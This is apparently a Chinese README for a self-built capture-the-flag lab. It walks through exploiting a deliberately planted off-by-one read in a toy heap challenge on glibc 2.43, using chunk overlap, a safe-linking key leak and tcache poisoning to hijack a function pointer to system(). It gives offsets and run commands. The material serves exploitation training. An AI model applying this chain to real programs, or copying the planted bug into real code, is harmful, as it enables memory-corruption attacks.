# L9 · off_by_one → chunk overlap（自造靶场）

> 一个字节的溢出能干什么？在 glibc 2.43 上，它能改写相邻 chunk 的 size LSB，
> 让一个 0x30 的块"变成"0x60，free 进更大的 tcache bin，再 malloc 回来时就
> 覆盖到了后面那个 chunk 的头部 —— 这就是 chunk overlap，接着就是标准的
> safe-linking tcache poisoning。

## 1. 环境

| 项 | 值 |
| --- | --- |
| 平台 | linux / amd64 |
| libc | **host glibc 2.43**（Ubuntu 2.43-2ubuntu2.7） |
| 编译 | `gcc -O0 -g -fno-pie -no-pie -fstack-protector-strong` |
| 依赖 | 只要主机 gcc，不需要额外 libc |

```bash
cd labs/lab_off_by_one
make
printf '__PWNED__{offbyone_ok}\n' > flag.txt
python exp.py            # 期望输出 __PWNED__{offbyone_ok} 与 "off-by-one -> overlap OK"
```

远程验证（可选）：

```bash
socat TCP-LISTEN:9999,reuseaddr,fork EXEC:./chal
HOST=127.0.0.1 PORT=9999 python exp.py
```

## 2. 漏洞

`edit(i)` 里：

```c
read(0, cards[i], sizes[i] + 1);   /* ← 多读 1 字节 */
```

`malloc_usable_size(size) == size`（glibc 允许借用下一块的 `prev_size` 字段），
所以第 `size + 1` 个字节**正好落在下一个 chunk 的 size 最低字节**上。
另外 `del` 不清 `cards[] / sizes[]`，于是 `show` 能读已释放的块，泄漏
safe-linking 的页号 key。

## 3. 利用链

```
add(0..3, 0x28)                # 四个相邻 0x30 chunk；chunk3 是安全边界
edit(0, 'A'*0x28 + '\x61')     # chunk1.size: 0x31 -> 0x61（prev_inuse 位保留）
del(1)                         # chunk1 以 0x60 的身份进 tcache[0x60]
del(2)                         # chunk2 进 tcache[0x30]
page = show(2, 8)              # chunk2->next = chunk2 >> 12（safe-linking key）
add(4, 0x58, payload)          # 取回 chunk1，写 0x58 字节 → 覆盖 chunk2 的头
add(5, 0x28)                   # 弹出 chunk2，tcache 头变成 &handlers
add(6, 0x28, p64(win))         # malloc 落到 .bss 的 handlers[] → handlers[0] = win
trigger(0)                     # → system("cat flag.txt")
```

关键偏移（payload 从 chunk1.user 起算）：

| 偏移 | 含义 |
| --- | --- |
| `0x00` | chunk1 的 user 前 0x20 字节 |
| `0x20` | chunk2.prev_size |
| `0x28` | chunk2.size（要写回合法值 0x31） |
| `0x30` | chunk2->next（= `&handlers ^ page`） |
| `0x38` | chunk2->key |

## 4. 预期失败点（踩过的坑）

1. **偏移不能按"名义大小"算**。chunk1 被改成 0x61 只是标记，物理布局仍是
   0x30，所以 chunk2 的头在 `chunk1.user + 0x20`，不是 `+0x30`。写错会得到
   `malloc(): unaligned tcache chunk detected`。
2. **`add` 是定长读**，最后一步写 `handlers` 时只发 8 字节会让
   `read() != size` → 程序直接 `exit(0)`，表现为"利用成功但没输出"。
3. **`handlers` 必须 16 字节对齐**：`tcache_get()` 的 `aligned_OK(e)` 会检查；
   而且 `&handlers + 8` 必须在映射内，因为 `tcache_get()` 还会回写 `e->key = 0`。
4. **free(chunk1) 之后 chunk3 仍要合法**：`nextchunk = chunk1 + 0x60` 落在
   chunk3 上，所以 chunk3 必须是一个真实分配过的 0x30 块。

## 5. 复现留痕

* 二进制：`chal`（`make` 生成）
* flag：`flag.txt`（verify_all.sh 用 `mk_flag` 自动写入）
* 一键验证：仓库根目录 `bash tools/verify_all.sh`，会跑 `L9` 这一行
* 回归证据：2026-11-26 实测 `PASS`，`__PWNED__{offbyone_ok}`
* 调试开关：`ERRLOG=/tmp/e9.log python exp.py` 会把子进程 stderr 落盘，
  用来直接看 glibc 的 `malloc_printerr` 原文（例如
  `malloc(): unaligned tcache chunk detected`）。默认不设，无副作用。
